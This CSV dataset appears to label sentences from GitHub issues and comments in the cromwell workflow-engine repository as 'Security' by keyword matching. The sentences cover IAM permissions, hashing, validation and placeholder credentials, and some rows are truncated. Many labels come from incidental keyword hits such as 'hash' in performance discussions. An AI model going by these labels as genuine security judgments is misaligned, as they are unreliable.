quality_attribute,sentence,source,author,repo,version,id,keyword,matched_word,match_idx,wiki,url,total_similar,target_keywords,target_matched_words
Security,WorkflowValidationActor - Generic Validation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/433:34,Validat,Validation,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/433,1,['Validat'],['Validation']
Security,"Would having that information (filesystems configured for a backend) in the existing backend endpoint work for you ? I don't think we can consider a generic ""get a config value"" endpoint as it would be a massive security hole because the configuration contains secrets and passwords.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4317#issuecomment-433236430:212,secur,security,212,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4317#issuecomment-433236430,2,"['password', 'secur']","['passwords', 'security']"
Security,"Would you mind explaining the difference between `pull` and `build`? The reason I did build is because I needed to know where the output image ended up, so I could run it directly. If I `singularity pull docker://ubuntu`'d the image, and then `singularity run docker://ubuntu` from the worker, it would still try to pull the image a second time, and then hang forever because it didn't have network access. . Also, isn't the ability to build a binary image something that `build` can do, not `pull`?. The only reason I built a sandbox instead is simply because my admins wouldn't set the `setuid` bit, so it wouldn't work. Am I missing something here?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461708333:399,access,access,399,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461708333,2,['access'],['access']
Security,Wrap hash values from cromwell-backend,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/457:5,hash,hash,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/457,1,['hash'],['hash']
Security,"Write a workflow such that you run a task A, and then run task A again with one of the call caching hash components is altered to confirm there were no false positive call cache hits. The hash components to tweak include:; - [x] input files (in this case, a secondary task can be used to alter the input files for task A); - [x] command template; - [x] backend name; - [x] output expressions; - [x] runtime attributes; - [x] non-file inputs",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1985:100,hash,hash,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1985,2,['hash'],['hash']
Security,Write some stub functions to request if access should be granted or to associate a workflow id with a principal. At this stage the responses can be completely mocked,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2131:40,access,access,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2131,1,['access'],['access']
Security,XhwcmVzc2lvbi9yZW5hbWluZy9CaW5hcnlPcGVyYXRvckV2YWx1YXRvcnMuc2NhbGE=) | `0% <0%> (-100%)` | :arrow_down: |; | [...l/services/womtool/models/WomTypeJsonSupport.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-c2VydmljZXMvc3JjL21haW4vc2NhbGEvY3JvbXdlbGwvc2VydmljZXMvd29tdG9vbC9tb2RlbHMvV29tVHlwZUpzb25TdXBwb3J0LnNjYWxh) | `0% <0%> (-100%)` | :arrow_down: |; | [...end/impl/sfs/config/CpuDeclarationValidation.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-c3VwcG9ydGVkQmFja2VuZHMvc2ZzL3NyYy9tYWluL3NjYWxhL2Nyb213ZWxsL2JhY2tlbmQvaW1wbC9zZnMvY29uZmlnL0NwdURlY2xhcmF0aW9uVmFsaWRhdGlvbi5zY2FsYQ==) | `0% <0%> (-100%)` | :arrow_down: |; | [...aft2/src/main/scala/wdl/draft2/model/package.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-d2RsL21vZGVsL2RyYWZ0Mi9zcmMvbWFpbi9zY2FsYS93ZGwvZHJhZnQyL21vZGVsL3BhY2thZ2Uuc2NhbGE=) | `0% <0%> (-100%)` | :arrow_down: |; | [...ool/src/main/scala/womtool/validate/Validate.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-d29tdG9vbC9zcmMvbWFpbi9zY2FsYS93b210b29sL3ZhbGlkYXRlL1ZhbGlkYXRlLnNjYWxh) | `0% <0%> (-100%)` | :arrow_down: |; | [...king/expression/files/BiscayneFileEvaluators.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-d2RsL3RyYW5zZm9ybXMvYmlzY2F5bmUvc3JjL21haW4vc2NhbGEvd2RsL3RyYW5zZm9ybXMvYmlzY2F5bmUvbGlua2luZy9leHByZXNzaW9uL2ZpbGVzL0Jpc2NheW5lRmlsZUV2YWx1YXRvcnMuc2NhbGE=) | `0% <0%> (-100%)` | :arrow_down: |; | [...in/scala/cromwell/backend/impl/bcs/BcsDocker.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-c3VwcG9ydGVkQmFja2VuZHMvYmNzL3NyYy9tYWluL3NjYWxhL2Nyb213ZWxsL2JhY2tlbmQvaW1wbC9iY3MvQmNzRG9ja2VyLnNjYWxh) | `0% <0%> (-100%)` | :arrow_down: |; | [...in/scala/cromwell/services/metadata/metadata.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-c2VydmljZXMvc3JjL21ha,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4947#issuecomment-491028620:2925,validat,validate,2925,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4947#issuecomment-491028620,3,"['Validat', 'validat']","['Validate', 'validate']"
Security,"YAML claims to be a superset of JSON, but it is not (as this proves). Every time I have encountered YAML in a project it has been a headache, just my 2c. It is a strange syntax, with the potential for infinite recursion and bombs. It makes for a hard parser implementation, and there have been security and perfomance issues in the past. Fine for local configuration files, but probably not a good idea for any public facing APIs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3487#issuecomment-379600556:294,secur,security,294,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3487#issuecomment-379600556,1,['secur'],['security']
Security,"Yeah actually sorry I was giving @kshakir and the rest of you a hard time about the parent column. I thought about it a lot yesterday and realized that it does actually make sense. The key to it, which I think I didn't fully appreciate at the time, was that it was shards pointing to shards, which is the thing that the Namespace is not capturing. Using this approach we now have a way to keep track of multiple levels of scattering. For any entry, we can find all `Scatter` ancestors entries in the ExecutionStore and then we have the `Scatter` objects (in order going up the tree) along with their respective indexes. The lookup function (which resolves WDL identifiers into their values), should only need access to some data structure like this: `Seq[(item: String, collection: WdlExpression, index: Int)]`. Where the size of that `Seq` would be the same size as the number of times nested you are. This would allow it to properly index into the scattered arrays.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/143#issuecomment-133389325:709,access,access,709,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/143#issuecomment-133389325,1,['access'],['access']
Security,"Yeah, this was from way back when we on FC thought we'd be parsing the WDL and doing docker-hash switcheroos ourselves. But you ended up doing it! So my use case for needing this has gone away.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2701#issuecomment-335903681:92,hash,hash,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2701#issuecomment-335903681,1,['hash'],['hash']
Security,"Yep, you were right about this bug, it was because the IAM role that Cromwell uses did not have write access to the S3 bucket. The actual AWS Batch worker instances did have write access, so the workflow didn't fail until it hit `write_lines`, which is executed by the Cromwell server, not by the Batch machine. However, this is actually the fault of the CloudFormation scripts that generated this role. I used the scripts [hosted here](https://s3.amazonaws.com/aws-genomics-workflows/templates/cromwell/cromwell-server.template.yaml), from [this webpage](https://docs.opendata.aws/genomics-workflows/cromwell/cromwell-aws-batch/). Notice how the IAM role only has `s3:GetObject` permissions, not `PutObject` etc:. ```yaml; Ec2InstanceRole:; Type: AWS::IAM::Role; Properties:; Policies:; - PolicyName: !Sub CromwellServer-S3Bucket-Access-${AWS::Region}; PolicyDocument:; Version: 2012-10-17; Statement:; Effect: Allow; Resource: !Join ["""", [""arn:aws:s3:::"", !Ref S3BucketName, ""/*""]]; Action:; - ""s3:GetObject""; ```. @aednichols Do you happen to know who wrote these scripts or where the code is hosted? Because I would like to submit a change to them to fix this bug",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4275#issuecomment-431235259:102,access,access,102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4275#issuecomment-431235259,3,"['Access', 'access']","['Access', 'access']"
Security,"Yes I think the `-` needs to be escaped.; If you could also make the same change on line 52, and add a new line with your docker image in the table in `DockerImageIdentifierSpec` to validate that it works it would be great :). Thanks !",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2591#issuecomment-326665158:182,validat,validate,182,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2591#issuecomment-326665158,1,['validat'],['validate']
Security,Yes if the validation is going to be centralized here there have to be tests that are at least equivalent to what's in `WorkflowDescriptor`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/562#issuecomment-197048096:11,validat,validation,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/562#issuecomment-197048096,1,['validat'],['validation']
Security,"Yes that surprised me too. The numbers are averages so it's possible that it kinds of flattens out around ~20/30ms, and the 10000 happened to have slightly better runs. It does it 30 times for each of the sizes. The minimum time value would be a better indicator maybe. Edit: Did the same with min times. There's still a weird timing where 8K was longer.; The main difference between the 2 approaches is that before we would go through the list of ""done"" keys one by one until we find the one we want. Which means the longer the list the longer the time in average. However now we go through it once to create a map, and then it becomes a hash lookup every other time. for develop:. <img width=""326"" alt=""screen shot 2017-04-22 at 12 28 58 pm"" src=""https://cloud.githubusercontent.com/assets/2978948/25306250/5dcc9d1c-2757-11e7-8987-0aaec4d4a038.png"">. and this branch:; <img width=""323"" alt=""screen shot 2017-04-22 at 12 23 06 pm"" src=""https://cloud.githubusercontent.com/assets/2978948/25306253/68140aa8-2757-11e7-8483-f6f2770c031d.png"">",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2198#issuecomment-296384021:639,hash,hash,639,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2198#issuecomment-296384021,1,['hash'],['hash']
Security,"Yes there are! Like if your inputs are shared with other users and they; come from varying sources and you're not allowed to make copies. Something; like that is very common. On Fri, Jun 7, 2019 at 7:25 PM W. Lee Pang, PhD <notifications@github.com>; wrote:. > This line in the stack trace indicates the root cause:; >; > at software.amazon.awssdk.services.s3.S3Client.listBuckets(S3Client.java:2184); >; > The permissions for the Cromwell server currently only provide full access; > to the S3 bucket specified in the CloudFormation template. Adding the; > AmazonS3ReadOnlyAccess managed policy to the server's instance profile; > fixes this, but I wonder if it can be more refined. Specifically, is there; > a case where a Cromwell server would need to read from more than one bucket?; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/4686?email_source=notifications&email_token=ADR7XTOW5ARNYDZTLRZEEODPZLU6RA5CNFSM4G2ZBAQ2YY3PNVWWK3TUL52HS4DFVREXG43VMVBW63LNMVXHJKTDN5WW2ZLOORPWSZGODXHHEUY#issuecomment-500068947>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ADR7XTOOSUHDDDUED4MXDEDPZLU6RANCNFSM4G2ZBAQQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-500810085:475,access,access,475,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-500810085,1,['access'],['access']
Security,"Yes, that's granting it at the project level (`gcloud projects add-iam-policy-binding`).; Granting at the SA level would probably be in this case; ```; gcloud iam service-accounts add-iam-policy-binding \; serviceAccount:MY-NUMBER-compute@developer.gserviceaccount.com \; --member serviceAccount:MY-NUMBER-compute@developer.gserviceaccount.com \; --role roles/iam.serviceAccountUser; ```; Notice that here we grant `MY-NUMBER-compute` SA `iam.serviceAccountUser` role on itself! This is probably not the best practice, as you should use a separate SA for Cromwell VM from the one that is used by Cromwell jobs.; Still, this is better than granting it at the project level, as otherwise any machine started with the default `MY-NUMBER-compute` SA can act as any other SA in that project. Additionally, it's not good to use the default SA at all, ideally you should create a dedicated SA for Cromwell itself and also another dedicated SA for the Cromwell jobs. That being said, if you're running this in an isolated project that doesn't have any access to anything else, this may be fine. But that's why it takes quite a bit of effort/know-how to set up Cromwell properly. I agree this is not an easy task, and should be documented a bit more ;)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686192065:1044,access,access,1044,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686192065,1,['access'],['access']
Security,"Yes... although since the 'encrypted-fields' is blank it probably doesn't; matter a whole lot but this does seem a little odd to me. Anyone know why; this was put in here?. ---. Kristian Cibulskis; Chief Architect, Data Sciences & Data Engineering; Broad Institute of MIT and Harvard; kcibul@broadinstitute.org. On Mon, Nov 23, 2015 at 3:55 PM, Chris Llanwarne notifications@github.com; wrote:. > I see in application.conf the following. Is this a candidate for storing; > securely in vault?; > ; > workflow-options {; > // These workflow options will be encrypted when stored in the database; > encrypted-fields: []; > ; > // AES-256 key to use to encrypt the values in encrypted-fields; > base64-encryption-key: ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=""; > }; > ; > —; > Reply to this email directly or view it on GitHub; > https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159061507; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159069141:27,encrypt,encrypted-fields,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159069141,7,"['encrypt', 'secur']","['encrypt', 'encrypted', 'encrypted-fields', 'encryption-key', 'securely']"
Security,"You're specifying both a tag and a hash, which you're right docker recognizes as a valid image (surprisingly I must say). We should fix Cromwell to validate that correctly. In the meantime if you use `quay.io/biocontainers/star@sha256:352f627075e436016ea2c38733b5c0096bb841e2fadcbbd3d4ae8daf03ccdf1b` it should work",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2254#issuecomment-300552698:35,hash,hash,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2254#issuecomment-300552698,2,"['hash', 'validat']","['hash', 'validate']"
Security,Zero is a perfectly valid size for a disk specification. At the moment it is disallowed because it's wired in through the same validations we use for things which don't make sense to be zero (e.g. CPU/memory). . Allow for zero sized disk,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4150:127,validat,validations,127,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4150,1,['validat'],['validations']
Security,[32] Fix performance issues with concurrent HTTP import validation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3935:56,validat,validation,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3935,1,['validat'],['validation']
Security,[33] Fix performance issues with concurrent HTTP import validation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3936:56,validat,validation,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3936,1,['validat'],['validation']
Security,[34 hotfix] Reduce hash cost of WdlSyntaxErrorFormatter (#3965),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3975:19,hash,hash,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3975,1,['hash'],['hash']
Security,[34] Fix performance issues with concurrent HTTP import validation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3937:56,validat,validation,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3937,1,['validat'],['validation']
Security,[5170 PR Clone]: add validation of ARN in general and queue ARN [BA-5994],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5188:21,validat,validation,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5188,1,['validat'],['validation']
Security,[53 hotfix] Add error handling if Google returns null for file size or hash [BW-415],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6006:71,hash,hash,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6006,1,['hash'],['hash']
Security,[AWS] IOException: Could not read from ... Unable to execute HTTP request: Certificate for ...,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4321:75,Certificate,Certificate,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4321,1,['Certificate'],['Certificate']
Security,[Do not merge] Db restrict metadata access,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2428:36,access,access,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2428,1,['access'],['access']
Security,"[The ticket](https://broadworkbench.atlassian.net/browse/DDO-2190) has a ton more info and I talked with @aednichols about this--the short version is:; - Whatever is doing the HTTP request to Cromwell (Akka?) does not set the Host header ([per MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Host)) if it has been customized beforehand; - We've accidentally been doing that by copying the _request's_ headers that came into CromIAM, which obviously include the Host header correlating to CromIAM itself; - Thus CromIAM sends requests to Cromwell with an incorrect Host header; - This hasn't mattered before because Cromwell's Layer 4 load balancer doesn't care and Cromwell's Apache proxy didn't actually need to do host-based routing because it just forwards everything to one app, Cromwell; - This suddenly matters a lot now because BEEs use an Nginx controller for ingress instead of a GCP Layer 4 load balancer, and _it_ needs to use host-based routing; - TL;DR: CromIAM is proxying to Cromwell wrong-ish and it very much does not work in BEEs. Solution: strip out the Host header just like CromIAM already does for Timeout-Access, and everything is happy. The impact to live environments should be zero because they clearly didn't care about the header before. If this fails anywhere, Argo sees the failure immediately like it did for BEEs, and it sees it in a way that any deployment or promotion would be halted because CromIAM would fail to come online from Argo's perspective.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6803:1143,Access,Access,1143,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6803,1,['Access'],['Access']
Security,[WX-1410] Sanitize 4 byte UTF-8 characters before inserting into METADATA_ENTRY,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7414:10,Sanitiz,Sanitize,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7414,1,['Sanitiz'],['Sanitize']
Security,"[WX-968](https://broadworkbench.atlassian.net/browse/WX-968). - Gave Centaur the ability to authenticate with Azure Blob Storage and count files at a particular path. ; - Added file counting to our single, lonely, overworked, and under-appreciated azure integration test. . I'm new to Scala. Please feel free to be pedantic and nitpicky in your comments! . [WX-968]: https://broadworkbench.atlassian.net/browse/WX-968?atlOrigin=eyJpIjoiNWRkNTljNzYxNjVmNDY3MDlhMDU5Y2ZhYzA5YTRkZjUiLCJwIjoiZ2l0aHViLWNvbS1KU1cifQ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7104:92,authenticat,authenticate,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7104,1,['authenticat'],['authenticate']
Security,[develop] Add error handling if Google returns null for file size or hash [BW-415],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6007:69,hash,hash,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6007,1,['hash'],['hash']
Security,"[info] 58e64982-cf3d-4e77-ad72-acfda8299d1b-EngineJobExecutionActor-expanse_figures.CBL_assoc:NA:1 [58e64982]: Call cache hit process had 0 total hit failures before completing successfully; ```. Can someone help me diagnose why call caching isn't near instantaneous, and what I can do to make it much faster? Happy to provide more information as necessary. Thanks!. Config:; ```; # See https://cromwell.readthedocs.io/en/stable/Configuring/; # this configuration only accepts double quotes! not singule quotes; include required(classpath(""application"")). system {; abort-jobs-on-terminate = true; io {; number-of-requests = 30; per = 1 second; }; file-hash-cache = true; }. # necessary for call result caching; # will need to stand up the MySQL server each time before running cromwell; # stand it up on the same node that's running cromwell; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true""; user = ""root""; password = ""pass""; connectionTimeout = 5000; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. docker {; hash-lookup {; enabled = true; method = ""remote""; }; }. backend {; # which backend do you want to use?; # Right now I don't know how to choose this via command line, only here; default = ""Local"" # For running jobs on an interactive node; #default = ""SLURM"" # For running jobs by submitting them from an interactive node to the cluster; providers { ; # For running jobs on an interactive node; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10; run-in-background = true; root = ""cromwell-executions""; dockerRoot = ""/cromwell-executions""; runtime-attributes = """"""; String? docker; """"""; submit = ""/usr/bin/env bash ${script}"". # We're asking bash-within-singularity to run the script, but the script's location on the machine; # is different then the location its mo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108:3561,password,password,3561,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108,1,['password'],['password']
Security,"\"",\n \""-Xms$(get_start_memory())m\"",\n \""-Xmx$(get_max_memory_from_runtime_memory(runtime.ram))m\"",\n \""-jar\"",\n \""/opt/linx/linx.jar\""\n ],\n \""inputs\"": [\n {\n \""type\"": [\n \""null\"",\n \""int\""\n ],\n \""doc\"": \""threshold for # SVs in clusters to skip chaining routine (default = 2000)\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-chaining_sv_limit\""\n },\n \""default\"": 2000,\n \""id\"": \""#linx-1.10-beta.cwl/chaining_sv_limit\""\n },\n {\n \""type\"": [\n \""null\"",\n \""boolean\""\n ],\n \""doc\"": \""Optional - Discover and annotate gene fusions\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-check_drivers\""\n },\n \""default\"": false,\n \""id\"": \""#linx-1.10-beta.cwl/check_drivers\""\n },\n {\n \""type\"": [\n \""null\"",\n \""boolean\""\n ],\n \""doc\"": \""Optional - discover and annotate gene fusions\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-check_fusions\""\n },\n \""default\"": false,\n \""id\"": \""#linx-1.10-beta.cwl/check_fusions\""\n },\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""[password]\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-db_pass\""\n },\n \""id\"": \""#linx-1.10-beta.cwl/db_pass\""\n },\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""[db_url]\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-db_url\""\n },\n \""id\"": \""#linx-1.10-beta.cwl/db_url\""\n },\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""[username]\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-db_user\""\n },\n \""id\"": \""#linx-1.10-beta.cwl/db_user\""\n },\n {\n \""type\"": [\n \""null\"",\n \""File\""\n ],\n \""doc\"": \""list of known fragile sites - specify Chromosome,PosStart,PosEnd - fragile_sites.csv\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-fragile_site_file\""\n },\n \""id\"": \""#linx-1.10-beta.cwl/fragile_site_file\""\n },\n {\n \""type\"": [\n \""null\"",\n \""int\""\n ],\n \""doc\"": \""Distance upstream of gene to consider a breakend applicable\\n\"",\n \""default\"": 100000,\n \""id\"": \""#linx-1.10-beta.cwl/fusion_gene_distance\""\n },\n {\n \""type\"": [\n \""null\"",\n \""File\""\n ],\n \""doc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:85997,password,password,85997,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['password'],['password']
Security,"] Running with database db.url = jdbc:hsqldb:mem:fad09ca5-b589-4874-b5de-bbd1dc0064fe;shutdown=false;hsqldb.tx=mvcc; [2019-07-10 14:32:53,36] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2019-07-10 14:32:53,38] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-07-10 14:32:53,46] [info] Running with database db.url = jdbc:hsqldb:mem:39174976-89f7-4769-a52c-7d5a4afc6cf4;shutdown=false;hsqldb.tx=mvcc; [2019-07-10 14:32:53,81] [info] Slf4jLogger started; [2019-07-10 14:32:54,07] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-1cf43fa"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""failureShutdownDuration"" : ""5 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2019-07-10 14:32:54,11] [info] Metadata summary refreshing every 1 second.; [2019-07-10 14:32:54,12] [warn] 'docker.hash-lookup.gcr-api-queries-per-100-seconds' is being deprecated, use 'docker.hash-lookup.gcr.throttle' instead (see reference.conf); [2019-07-10 14:32:54,12] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2019-07-10 14:32:54,13] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-07-10 14:32:54,13] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-07-10 14:32:54,18] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2019-07-10 14:32:54,43] [info] SingleWorkflowRunnerActor: Version 42; [2019-07-10 14:32:54,44] [info] SingleWorkflowRunnerActor: Submitting workflow; [2019-07-10 14:32:54,48] [info] Unspecified type (Unspecified version) workflow 41d3eecf-c5a9-42e4-8a29-8be9c252b7f5 submitted; [2019-07-10 14:32:54,50] [info] SingleWorkflowRunnerActor: Workflow submitted 41d3eecf-c5a9-42e4-8a29-8be9c252b7f5; [2019-07-10 14:32:54,50] [info] 1 new workflows fetched by cromid-1cf43fa: 41d3eecf-c5a9-42e4-8a29-8b",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5066:5240,hash,hash-lookup,5240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5066,1,['hash'],['hash-lookup']
